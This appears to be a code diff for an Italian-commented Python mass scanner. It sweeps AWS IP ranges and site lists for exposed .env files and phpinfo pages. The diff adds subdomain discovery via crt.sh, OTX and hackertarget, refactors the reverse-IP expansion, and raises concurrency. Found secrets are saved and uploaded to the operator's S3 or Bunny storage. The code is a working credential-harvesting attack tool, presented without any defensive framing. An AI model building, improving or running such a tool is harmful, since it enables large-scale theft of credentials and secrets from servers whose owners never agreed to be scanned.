@@ -83,12 +83,12 @@ LOAD_FROM_CIDR = True
 USE_REV = True
 
 # --- Performance ---
-MAX_SITE_BATCH = 5
-MAX_LIST_ENV = 100
-MAX_LIST_PHP = 40
-DNS_WORKERS_EC2 = 50
+MAX_SITE_BATCH = 8
+MAX_LIST_ENV = 20
+MAX_LIST_PHP = 20
+DNS_WORKERS_EC2 = 100
 DNS_TIMEOUT_EC2 = 3
-MAX_IPS_PER_CIDR = 2
+MAX_IPS_PER_CIDR = 4
 TOTAL_SLOTS = 2000
 NUM_WORKERS = 1
 
@@ -97,7 +97,6 @@ NUM_WORKERS = 1
 # ============================================================
 
 LOGS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
-LOG_FILE = None
 LOG_PATH = None
 
 _CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
@@ -170,7 +169,8 @@ def _append_to_s3_index(s3_key_full):
 
     for attempt in range(5):
         try:
-            time.sleep(random.uniform(0.5, 3.0))
+            if attempt == 0:
+                time.sleep(random.uniform(0.3, 1.5))
 
             amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
             date_stamp = amz_date[:8]
@@ -362,13 +362,15 @@ def _upload_file(local_path, remote_path, max_retries=3):
     return ok
 
 def _upload_log():
-    """Carica il log su S3 e/o Bunny."""
+    """Carica il log su S3 e/o Bunny in base ai flag."""
     if not LOG_ACTIVE:
         return
     if not LOG_PATH or not os.path.exists(LOG_PATH):
         return
-    remote = f"logs/{os.path.basename(LOG_PATH)}"
-    _upload_file(LOG_PATH, remote, max_retries=1)
+    if AWS_S3:
+        upload_log_to_s3()
+    if BUNNY_STORAGE:
+        upload_log_to_bunny()
 
 # ============================================================
 # CONFIG FILE + FIRME
@@ -445,25 +447,104 @@ def get_retry_url(url):
         return None
     return f"https://{url}"
 
+def clean_subdomain(sub, domain):
+    sub = sub.strip().lower()
+    sub = re.sub(r'^https?://', '', sub)
+    sub = sub.split(':')[0]
+    if sub.startswith('*.'):
+        sub = sub[2:]
+    if sub.endswith('.'):
+        sub = sub[:-1]
+    if sub == domain or not sub.endswith(domain):
+        return sub
+    return sub
+
+def find_subdomains(domain):
+    subdomains = set()
+
+    urls = [
+        ("ht", f"https://api.hackertarget.com/hostsearch/?q={domain}", 10),
+        ("otx", f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns", 10),
+        ("crt", f"https://crt.sh/?q=%.{domain}&output=json", 15),
+    ]
+
+    greqs = [grequests.get(u, timeout=t, verify=False) for _, u, t in urls]
+    results = grequests.map(greqs)
+
+    for (source, url, _), r in zip(urls, results):
+        if r is None or r.status_code != 200:
+            continue
+        try:
+            if source == "ht":
+                if "error" not in r.text.lower():
+                    for line in r.text.strip().split('\n'):
+                        sub = clean_subdomain(line.split(',')[0], domain)
+                        if sub.endswith(domain) and sub != domain:
+                            subdomains.add(sub)
+            elif source == "otx":
+                data = r.json()
+                for entry in data.get('passive_dns', []):
+                    sub = clean_subdomain(entry.get('hostname', ''), domain)
+                    if sub.endswith(domain) and sub != domain:
+                        subdomains.add(sub)
+            elif source == "crt":
+                data = r.json()
+                for entry in data:
+                    name = entry.get('name_value', '')
+                    for cn in name.split('\n'):
+                        cn = clean_subdomain(cn, domain)
+                        if cn.endswith(domain) and cn != domain:
+                            subdomains.add(cn)
+        except:
+            pass
+
+    if subdomains:
+        result = []
+        for sub in sorted(subdomains):
+            if sub.startswith("www."):
+                sub = sub[4:]
+            result.append(sub)
+        return result
+    return None
+
 def reverse_ip_lookup(ip):
     url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
     try:
-        response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            result = response.text.strip()
-            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
-                return None
-            else:
-                aweee = []
-                domains = result.split('\n')
-                for d in domains:
-                    if d.startswith("www."):
-                        d = d[4:]
-                    aweee.append(d)
-                return aweee
-    except:
-        pass
-    return None
+        req = grequests.get(url, timeout=15, verify=False)
+        results = grequests.map([req])
+        r = results[0] if results else None
+        if r is None:
+            #print(f"  [REV] Debug: timeout/null per {ip}", flush=True)
+            return None
+        if r.status_code != 200:
+            #print(f"  [REV] Debug: HTTP {r.status_code} per {ip}", flush=True)
+            r.close()
+            return None
+        # Leggi content prima, fallback text
+        try:
+            result = r.text
+        except:
+            result = r.content.decode('utf-8', errors='ignore')
+        r.close()
+        result = result.strip()
+        if not result:
+            #print(f"  [REV] Debug: risposta vuota per {ip}", flush=True)
+            return None
+        if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
+            #print(f"  [REV] Debug: API err/limit per {ip}: {result[:100]}", flush=True)
+            return None
+        aweee = []
+        for d in result.split('\n'):
+            d = d.strip()
+            if not d:
+                continue
+            if d.startswith("www."):
+                d = d[4:]
+            aweee.append(d)
+        return aweee if aweee else None
+    except Exception as ex:
+        #print(f"  [REV] Debug: eccezione reverse_ip_lookup: {ex}", flush=True)
+        return None
 
 # ============================================================
 # LOAD FROM SITE FOLDER
@@ -608,24 +689,24 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         # ============================================================
         env_batches = site_payloads.get('env', [])
         for batch in env_batches:
-            if fake_for_site or found_for_site: return
+            if fake_for_site or found_for_site: break
             reqss = [grequests.get(url, stream=True, timeout=6, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
             merdb = grequests.map(reqss)
 
             for r in merdb:
-                if fake_for_site or found_for_site: return
+                if fake_for_site or found_for_site: break
                 if r is not None and r.status_code in [200, 206]:
                     checked += 1
                     try:
                         content = read_body(r)
                         content_lower = content.lower()
 
-                        # HTML detection: se risponde con HTML non e' un vero .env
+                        # HTML detection: skippa solo questo link, non l'intero sito
                         head = content_lower[:200]
                         if '<html' in head or '<!doctype' in head or '<body' in head:
                             print(f"  [!] HTML skip | {r.url}", flush=True)
                             r.close()
-                            break
+                            continue
 
                         # False positive check
                         if '<pre' in content_lower and '</pre>' in content_lower:
@@ -660,6 +741,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{r.url}\n{content}\n')
                             remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
                             _upload_file(saved_file_path, remote_subpath)
+                            break
                     except:
                         pass
                 if r:
@@ -678,25 +760,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
 
         if found_for_site:
             print(f"  [OK] STOP FOUND Mtch {site_link} — testati {checked} link", flush=True)
-            # Reverse / fallback
-            if USE_REV and not is_fallback:
-                hostxxx = urlparse(site_link).hostname
-                if hostxxx:
-                    if hostxxx.startswith("www."):
-                        hostxxx = hostxxx[4:]
-                    try:
-                        target_ip = socket.gethostbyname(hostxxx)
-                        reversed_domains = reverse_ip_lookup(target_ip)
-                        if reversed_domains:
-                            hostxxx_clean = hostxxx.lower().rstrip('/')
-                            reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
-                            if reversed_domains:
-                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
-                                for d in reversed_domains:
-                                    print(f"    [REV] => {d}", flush=True)
-                                process_urls(reversed_domains, is_fallback=True)
-                    except:
-                        pass
+            _do_reverse_and_subdomains(site_link, is_fallback)
             return
 
         # ============================================================
@@ -705,13 +769,13 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         php_batches = site_payloads.get('php', [])
         findfile_requests = []
         for batch in php_batches:
-            if fake_for_site or found_for_site: return
+            if fake_for_site or found_for_site: break
             reqss = [grequests.post(url, data={"0x01[]":"x"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
             merdb = grequests.map(reqss)
             unique_responses = {}
 
             for r in merdb:
-                if fake_for_site or found_for_site: return
+                if fake_for_site or found_for_site: break
                 if r is not None and r.status_code in [200, 206]:
                     checkeds += 1
                     if r.url not in unique_responses:
@@ -789,13 +853,6 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     if found_for_site:
                         print(f"  [+] Found | {response_url}", flush=True)
 
-                        # Salva ENV_NEW
-                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                        saved_file_path = os.path.join(newpathtextract, f'ENV_NEW_{rnd_suffix}.txt')
-                        with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                        remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
-                        _upload_file(saved_file_path, remote_subpath)
-
                         # PHPINFO extraction
                         try:
                             soup = BeautifulSoup(contentsx, "html.parser")
@@ -837,25 +894,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
             print(f"  [OK] STOP NOPE {site_link} — testati {total_tested} link (DUPE)", flush=True)
         elif found_for_site:
             print(f"  [OK] STOP FOUND Mtch {site_link} — testati {total_tested} link", flush=True)
-            # Reverse / fallback
-            if USE_REV and not is_fallback:
-                hostxxx = urlparse(site_link).hostname
-                if hostxxx:
-                    if hostxxx.startswith("www."):
-                        hostxxx = hostxxx[4:]
-                    try:
-                        target_ip = socket.gethostbyname(hostxxx)
-                        reversed_domains = reverse_ip_lookup(target_ip)
-                        if reversed_domains:
-                            hostxxx_clean = hostxxx.lower().rstrip('/')
-                            reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
-                            if reversed_domains:
-                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
-                                for d in reversed_domains:
-                                    print(f"    [REV] => {d}", flush=True)
-                                process_urls(reversed_domains, is_fallback=True)
-                    except:
-                        pass
+            _do_reverse_and_subdomains(site_link, is_fallback)
         else:
             print(f"  [OK] STOP NONE {site_link} — testati {total_tested} link", flush=True)
 
@@ -864,6 +903,74 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
             with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
         except:
             pass
+
+# ============================================================
+# REVERSE IP + SUBDOMAIN FINDER
+# ============================================================
+
+def _do_reverse_and_subdomains(site_link, is_fallback):
+    if not USE_REV or is_fallback:
+        return
+    hostxxx = urlparse(site_link).hostname
+    if not hostxxx:
+        return
+    if hostxxx.startswith("www."):
+        hostxxx = hostxxx[4:]
+
+    # IP diretto o dominio?
+    is_ip_addr = False
+    try:
+        ipaddress.ip_address(hostxxx)
+        is_ip_addr = True
+    except ValueError:
+        pass
+
+    if is_ip_addr:
+        domains = reverse_ip_lookup(hostxxx)
+        if domains:
+            domains = [d for d in domains if d.lower().rstrip('/') != hostxxx.lower().rstrip('/')]
+            if domains:
+                print(f"  [REV] IP {hostxxx} — trovati {len(domains)} domini da processare", flush=True)
+                for d in domains:
+                    print(f"    [REV] => {d}", flush=True)
+                process_urls(domains, is_fallback=True)
+            else:
+                print(f"  [REV] IP {hostxxx} — domini filtrati (tutti auto-referenziali)", flush=True)
+        else:
+            print(f"  [REV] IP {hostxxx} — nessun dominio trovato", flush=True)
+    else:
+        # Dominio: subdomains first, poi fallback reverse IP
+        parts = hostxxx.split(".")
+        target_domain = ".".join(parts[-2:]) if len(parts) > 2 else hostxxx
+        print(f"  [REV] Cerco subdomains per {target_domain}...", flush=True)
+        domains = find_subdomains(target_domain)
+        if domains:
+            domains = [d for d in domains if d.lower().rstrip('/') != hostxxx.lower().rstrip('/')]
+            if domains:
+                print(f"  [REV] Dominio {target_domain} — trovati {len(domains)} subdomains", flush=True)
+                for d in domains:
+                    print(f"    [REV] => {d}", flush=True)
+                process_urls(domains, is_fallback=True)
+            else:
+                print(f"  [REV] Dominio {target_domain} — subdomains filtrati", flush=True)
+        else:
+            print(f"  [REV] Nessun subdomain, provo reverse IP per {hostxxx}...", flush=True)
+            try:
+                target_ip = socket.gethostbyname(hostxxx)
+                domains = reverse_ip_lookup(target_ip)
+                if domains:
+                    domains = [d for d in domains if d.lower().rstrip('/') != hostxxx.lower().rstrip('/')]
+                    if domains:
+                        print(f"  [REV] IP {target_ip} — trovati {len(domains)} domini", flush=True)
+                        for d in domains:
+                            print(f"    [REV] => {d}", flush=True)
+                        process_urls(domains, is_fallback=True)
+                    else:
+                        print(f"  [REV] IP {target_ip} — domini filtrati", flush=True)
+                else:
+                    print(f"  [REV] IP {target_ip} — nessun dominio trovato", flush=True)
+            except Exception as ex:
+                print(f"  [REV] DNS fallito per {hostxxx}: {ex}", flush=True)
 
 # ============================================================
 # AWS CIDR
@@ -1088,7 +1195,10 @@ def main():
                 gather_and_scan_cycle(cidr_pool, worker_id, NUM_WORKERS, cycle)
                 print(f"[W{worker_id}] Ciclo #{cycle} completato.", flush=True)
 
-            # Se nessuno dei due e' attivo, esci
+            # Exit conditions
+            if LOAD_FROM_SITE and not LOAD_FROM_CIDR:
+                print(f"[SYS] Worker {worker_id} — Fine. Nessun CIDR attivo, uscita.", flush=True)
+                break
             if not LOAD_FROM_SITE and not LOAD_FROM_CIDR:
                 break
 
